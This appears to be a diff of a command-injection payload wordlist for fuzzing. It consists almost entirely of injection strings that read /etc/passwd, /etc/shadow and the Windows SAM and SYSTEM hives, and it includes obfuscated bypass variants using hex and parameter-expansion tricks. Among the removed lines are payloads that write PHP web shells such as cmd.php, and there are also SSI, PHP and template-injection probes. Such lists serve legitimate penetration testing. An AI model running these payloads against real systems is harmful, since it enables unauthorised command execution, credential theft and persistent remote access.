@@ -1,8 +1,22 @@
-&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
-g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
+`cat /etc/passwd`
+$(cat /etc/passwd)
+cat</etc/passwd
+{cat,/etc/passwd}
+something%0Acat%20/etc/passwd
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+cat `xxd -r -p <<< 2f6574632f706173737764`
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
-/index.html|id
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 ;id;
 ;id
 ;netstat -a;
@@ -17,7 +31,6 @@ g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 ||/usr/bin/id;
 ;id|
 ;|/usr/bin/id|
-\n/bin/ls -al\n
 \n/usr/bin/id\n
 \nid\n
 \n/usr/bin/id;
@@ -40,7 +53,6 @@ a)|id
 a|id
 a)|id;
 a|id
-|/bin/ls -al
 a);/usr/bin/id
 a;/usr/bin/id
 a);/usr/bin/id;
@@ -59,71 +71,26 @@ a|/usr/bin/id
 %0Aid
 %0A/usr/bin/id%0A
 %0Aid%0A
-& ping -i 30 127.0.0.1 &
-& ping -n 30 127.0.0.1 &
-%0a ping -i 30 127.0.0.1 %0a
-`ping 127.0.0.1`
 | id
 & id
 ; id
 %0a id %0a
 `id`
 $;/usr/bin/id
-cat /etc/hosts
 $(`cat /etc/passwd`)
-cat /etc/passwd
+;cat /etc/passwd
+;/bin/cat /etc/passwd
 %0Acat%20/etc/passwd
 {{ get_user_file("/etc/passwd") }}
 <!--#exec cmd="/bin/cat /etc/passwd"-->
-<!--#exec cmd="/bin/cat /etc/shadow"-->
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
-powershell C:\*\*2\n??e*d.*?
-@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e
-`
-|| 
-| 
-; 
-'
-'"
-"
-"'
-`cat /etc/passwd`
-$(cat /etc/passwd)
-cat</etc/passwd
-{cat,/etc/passwd}
-X=$'uname\x20-a'&&$X
-something%0Acat%20/etc/passwd
-cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
-`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
-cat `xxd -r -p <<< 2f6574632f706173737764`
-cat `xxd -r -ps <(echo 2f6574632f706173737764)`
-cat ${HOME:0:1}etc${HOME:0:1}passwd
-cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
-w'h'o'am'i
-w"h"o"am"i
-w\ho\am\i
-/\b\i\n/////s\h
-who$@ami
-test=/ehhh/hmtc/pahhh/hmsswd
-cat ${test//hhh\/hm/}
-cat ${test//hh??hm/}
-& 
-&& 
-%0a
-%0a%0d
 %0Aid
 %0a id %0a
 %0Aid%0A
-%0a ping -i 30 127.0.0.1 %0a
 %0A/usr/bin/id
 %0A/usr/bin/id%0A
-%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
-%20{${phpinfo()}}
-%20{${sleep(20)}}
-%20{${sleep(3)}}
 a|id|
 a;id|
 a;id;
@@ -140,34 +107,12 @@ $(`dir`)
 & dir C:\
 && dir C:\
 dir C:\
-| dir C:\Documents and Settings\*
-; dir C:\Documents and Settings\*
-& dir C:\Documents and Settings\*
-&& dir C:\Documents and Settings\*
-dir C:\Documents and Settings\*
 | dir C:\Users
 ; dir C:\Users
 & dir C:\Users
 && dir C:\Users
 dir C:\Users
-;echo%20'<script>alert(1)</script>'
-| echo "<?php include($_GET['page'])| ?>" > rfi.php
-; echo "<?php include($_GET['page']); ?>" > rfi.php
-& echo "<?php include($_GET['page']); ?>" > rfi.php
-&& echo "<?php include($_GET['page']); ?>" > rfi.php
-echo "<?php include($_GET['page']); ?>" > rfi.php
-| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php
-; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
-| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
-; echo "<?php system($_GET['cmd']); ?>" > cmd.php
-& echo "<?php system($_GET['cmd']); ?>" > cmd.php
-&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
-echo "<?php system($_GET['cmd']); ?>" > cmd.php
-() { :;}; echo vulnerable 10
-xec('ls')
+exec('ls')
 exec('pwd')
 exec('whoami');
 ;{$_GET["cmd"]}
@@ -188,14 +133,6 @@ $(`ls`)
 & ls -l /
 && ls -l /
 ls -l /
-| ls -laR /etc
-; ls -laR /etc
-& ls -laR /etc
-&& ls -laR /etc
-| ls -laR /var/www
-; ls -laR /var/www
-& ls -laR /var/www
-&& ls -laR /var/www
 | ls -l /etc/
 ; ls -l /etc/
 & ls -l /etc/
@@ -207,7 +144,6 @@ ls -lh /etc/
 & ls -l /home/*
 && ls -l /home/*
 ls -l /home/*
-*; ls -lhtR /var/www/
 | ls -l /tmp
 ; ls -l /tmp
 & ls -l /tmp
@@ -230,15 +166,9 @@ netstat -an
 \nid;
 \nid\n
 \n/usr/bin/id\n
-`ping 127.0.0.1`
-& ping -i 30 127.0.0.1 &
-& ping -n 30 127.0.0.1 &
 system('cat C:\boot.ini');
 system('cat config.php');
 system('ls')
-system('whoami')
-system('whoami');
-test*; ls -lhtR /var/www/
 $(`type C:\boot.ini`)
 &&type C:\\boot.ini
 | type C:\Windows\repair\SAM
@@ -267,16 +197,6 @@ type %SYSTEMROOT%\repair\SAM
 & type %SYSTEMROOT%\repair\SYSTEM
 && type %SYSTEMROOT%\repair\SYSTEM
 type %SYSTEMROOT%\repair\SYSTEM
-| uname -a
-; uname -a
-& uname -a
-&& uname -a
-uname -a
-|/usr/bin/id
-;|/usr/bin/id|
-;/usr/bin/id|
-$;/usr/bin/id
-| uname -a
 ; id
 ' id
 ' || id
@@ -292,8 +212,3 @@ $;/usr/bin/id
 $(`id`)
 & id
 && id
-{{ get_user_file("C:\boot.ini") }}
-{{ get_user_file("/etc/hosts") }}
-{{person.secret}}
-{{person.name}}
-{{[] .__ Class __.__ base __.__ subclasses __ ()}}
